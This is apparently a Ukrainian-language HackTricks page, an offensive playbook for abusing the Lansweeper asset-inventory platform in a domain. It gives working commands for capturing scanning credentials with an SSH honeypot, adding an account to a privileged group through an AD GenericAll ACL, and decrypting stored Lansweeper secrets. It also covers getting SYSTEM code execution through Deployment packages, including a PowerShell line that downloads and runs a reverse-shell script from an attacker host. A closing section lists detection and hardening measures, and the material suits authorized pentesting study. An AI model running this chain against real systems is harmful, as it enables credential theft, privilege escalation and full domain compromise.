# Зловживання Lansweeper: збір облікових даних, розшифрування секретів і RCE через Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper — це платформа для виявлення та інвентаризації IT-активів, яку зазвичай розгортають у Windows та інтегрують з Active Directory. Облікові дані, налаштовані в Lansweeper, використовуються його рушіями сканування для автентифікації до активів через такі протоколи, як SSH, SMB/WMI та WinRM. Поширені помилкові налаштування часто дають змогу:

- Перехоплювати облікові дані, перенаправляючи ціль сканування на хост під контролем атакувальника (honeypot)
- Зловживати AD ACL, доступними через пов’язані з Lansweeper групи, щоб отримати віддалений доступ
- Розшифровувати налаштовані в Lansweeper секрети безпосередньо на хості (рядки підключення та збережені облікові дані для сканування)
- Виконувати код на керованих кінцевих точках через функцію Deployment (часто від імені SYSTEM)

На цій сторінці наведено практичні сценарії та команди атакувальника для зловживання цими можливостями під час engagement.

## 1) Збір облікових даних для сканування через honeypot (приклад із SSH)

Ідея: створити Scanning Target, який вказує на ваш хост, і призначити йому наявні Scanning Credentials. Коли запускається сканування, Lansweeper спробує автентифікуватися за допомогою цих облікових даних, а ваш honeypot перехопить їх.<sup>[[1]](#references)</sup>

Огляд кроків (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (або Single IP) = ваша VPN IP
- Налаштуйте SSH port на доступний порт (наприклад, 2022, якщо 22 заблокований)
- Вимкніть schedule та заплануйте ручний запуск
- Scanning → Scanning Credentials → переконайтеся, що Linux/SSH creds існують; призначте їх новій цілі (за потреби ввімкніть усі)
- Натисніть “Scan now” для цілі
- Запустіть SSH honeypot та отримайте ім’я користувача/пароль, які були використані для спроби підключення

Приклад із sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Перевірка отриманих облікових даних у службах DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Нотатки
- Інші протоколи не є еквівалентними: SMB/WinRM listener зазвичай отримує NTLM challenge-response, а не пароль у відкритому вигляді. Його cracking або relaying залежить від узгоджених захистів протоколу; див. [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). Автентифікація паролем через SSH зазвичай є найпростішим випадком отримання даних у відкритому вигляді.
- Автентифікація за допомогою SSH public-key розкриває серверу username і fingerprint публічного ключа, **але не приватний ключ або його passphrase**. Отримуйте key-backed credentials із compromised Lansweeper server, а не очікуйте, що honeypot розкриє їх.<sup>[[2]](#references)</sup>
- Багато сканерів ідентифікують себе за допомогою distinct client banners (наприклад, RebexSSH) і виконують benign commands (uname, whoami тощо).

### Порядок вибору credentials має значення

Під час повторного сканування Lansweeper спочатку повторно використовує credential, який востаннє успішно працював для цього asset, потім явно зіставлені credentials у налаштованому для них порядку і, нарешті, global credential того самого типу. Honeypot, який приймає першу password authentication, зазвичай не побачить наступні fallback credentials; під час authorized credential-path assessment записуйте та відхиляйте спроби, якщо мета полягає в перевірці повної fallback sequence.<sup>[[6]](#references)</sup>

## 2) Зловживання AD ACL: отримайте remote access, додавши себе до app-admin group

Використовуйте BloodHound для переліку effective rights compromised account. Поширена знахідка — scanner- або app-specific group (наприклад, “Lansweeper Discovery”), яка має GenericAll над privileged group (наприклад, “Lansweeper Admins”). Якщо privileged group також є членом “Remote Management Users”, WinRM стане доступним після того, як ми додамо себе.<sup>[[1]](#references)[[5]](#references)</sup>

Приклади collection:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll для групи за допомогою BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Тоді отримайте інтерактивний shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Порада: операції Kerberos чутливі до часу. Якщо ви зіткнулися з KRB_AP_ERR_SKEW, спочатку синхронізуйте час із DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Розшифрування секретів, налаштованих у Lansweeper

На сервері Lansweeper сайт ASP.NET зазвичай зберігає зашифрований рядок підключення та симетричний ключ, який використовується застосунком. За наявності відповідного локального доступу можна розшифрувати рядок підключення до DB, а потім отримати збережені облікові дані для сканування.<sup>[[1]](#references)</sup>

Типові розташування:
- Конфігурація вебсайту: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Ключ застосунку: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Використовуйте SharpLansweeperDecrypt для автоматизації розшифрування та виведення збережених облікових даних. Без аргументів поточний виконуваний файл розшифровує `web.config`, підключається до бази даних і виводить усі налаштовані облікові дані для сканування; `-e` також підтримує offline/manual розшифрування, коли зашифроване значення та файл ключа вже доступні:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
Очікуваний результат містить відомості про підключення до DB і облікові дані для сканування у відкритому тексті, зокрема облікові записи Windows і Linux, що використовуються в усій інфраструктурі. Вони часто мають підвищені локальні права на хостах домену:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Використовуйте відновлені облікові дані для сканування Windows для привілейованого доступу:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Як учасник групи “Lansweeper Admins”, у вебінтерфейсі відкривається доступ до Deployment і Configuration. У розділі Deployment → Deployment packages можна створювати пакети, які виконують довільні команди на цільових активах. Lansweeper використовує облікові дані адміністративного сканування для доступу до Task Scheduler і `C$` цільового хоста, а потім створює завдання для deployment. Коли для пакета вибрано режим запуску **System Account**, payload виконується від імені `NT AUTHORITY\SYSTEM`; інші режими запуску можуть використовувати облікові дані сканування або поточного користувача, який увійшов у систему, тому перевіряйте вибраний режим і не припускайте автоматично, що це SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>

Основні кроки:
- Створіть новий Deployment package, який виконує однорядкову команду PowerShell або cmd (reverse shell, add-user тощо).
- Виберіть потрібний asset (наприклад, DC/хост, на якому працює Lansweeper) і натисніть Deploy/Run now.
- Перехопіть shell із правами SYSTEM.

Приклади payload (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Дії з розгортання створюють багато шуму та залишають записи в Lansweeper і журналах подій Windows. Використовуйте їх обачно.

### Артефакти розгортання та друга точка розкриття облікових даних

Сканер записує виконуваний файл розгортання до `C:\Windows\LSDeployment` через `C$`. Файли пакетів зазвичай зчитуються з `DefaultPackageShare$`, який використовує `C:\Program Files (x86)\Lansweeper\PackageShare`, або зі спільного ресурсу пакетів, специфічного для діапазону IP-адрес. Важливо, що Lansweeper документує зберігання облікових даних спільного ресурсу пакетів **у формі, що піддається зворотному розшифруванню, у реєстрі кожного комп'ютера, на якому виконується розгортання**. Розглядайте скомпрометовану керовану кінцеву точку як потенційну точку розкриття облікового запису цього спільного ресурсу та під час реконструкції активності Lansweeper перевіряйте каталог розгортання, історію запланованих завдань і налаштовані спільні ресурси пакетів.<sup>[[7]](#references)</sup>

## Виявлення та hardening

- Обмежте або вимкніть анонімне перерахування SMB. Відстежуйте RID cycling і аномальний доступ до спільних ресурсів Lansweeper.
- Контроль вихідного трафіку: заблокуйте або жорстко обмежте вихідні SSH/SMB/WinRM-з'єднання з хостів сканера. Створюйте сповіщення про нестандартні порти (наприклад, 2022) і незвичайні банери клієнтів, як-от Rebex.
- Захистіть `Website\\web.config` і `Key\\Encryption.txt`. Винесіть секрети до vault і змінюйте їх у разі розкриття. Розгляньте сервісні облікові записи з мінімальними привілеями та gMSA, де це можливо.
- Моніторинг AD: створюйте сповіщення про зміни в групах, пов'язаних із Lansweeper (наприклад, “Lansweeper Admins”, “Remote Management Users”), а також про зміни ACL, що надають GenericAll/Write для членства у привілейованих групах.
- Аудит створення/змін/виконання Deployment package і зіставлення нових віддалених запланованих завдань із записами до `C:\Windows\LSDeployment`; створюйте сповіщення про пакети, що запускають `cmd.exe`/`powershell.exe`, або про неочікувані вихідні з'єднання.
- Надавайте обліковим даним спільного ресурсу пакетів лише дозвіл **Read & Execute** і ніколи не використовуйте їх повторно для адміністрування. За можливості надавайте перевагу інвентаризації на основі агентів: якщо всі комп'ютери скануються агентом, а модуль розгортання не використовується, Lansweeper не потребує збережених облікових даних для сканування комп'ютерів.<sup>[[6]](#references)[[7]](#references)</sup>

## Пов'язані теми
- [Перерахування SMB/LSA/SAMR і RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Автентифікація Kerberos і міркування щодо розбіжності часу](kerberos-authentication.md)
- [Аналіз шляхів BloodHound](bloodhound.md)
- [Використання WinRM і lateral movement](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Зловживання скануванням Lansweeper, ACL AD і секретами для захоплення DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Створення та зіставлення облікових даних для сканування — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Вимоги до розгортання — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
